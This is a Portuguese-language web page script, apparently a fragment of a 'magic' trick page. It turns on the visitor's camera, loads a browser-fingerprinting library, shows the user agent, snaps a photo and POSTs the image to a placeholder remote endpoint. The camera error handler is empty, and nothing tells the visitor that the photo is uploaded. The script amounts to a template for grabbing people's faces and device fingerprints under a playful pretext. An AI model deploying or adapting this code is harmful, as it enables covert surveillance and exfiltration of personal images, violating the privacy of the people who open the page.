    <script>
      let videoStream = null;

      async function iniciarMagia() {
        const video = document.getElementById("camera");

        try {
          videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
          video.srcObject = videoStream;
          video.style.display = "block";
        } catch (err) {

        }

        const fp = await FingerprintJS.load();

        document.getElementById("info").innerHTML = `

          <strong>Sistema:</strong> ${navigator.userAgent}<br>

        `;
      }

      function capturarFoto() {
        const video = document.getElementById("camera");
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const dataUrl = canvas.toDataURL("image/jpeg");
        const img = document.getElementById("foto-capturada");
        img.src = dataUrl;
        img.style.display = "block";

        fetch("https://SEU-ENDPOINT-AQUI/upload", {
          method: "POST",
          body: JSON.stringify({ imagem: dataUrl }),
          headers: { "Content-Type": "application/json" }
        })
        .then(res => console.log("Imagem enviada com sucesso"))
        .catch(err => console.error("Erro ao enviar imagem:", err));
      }
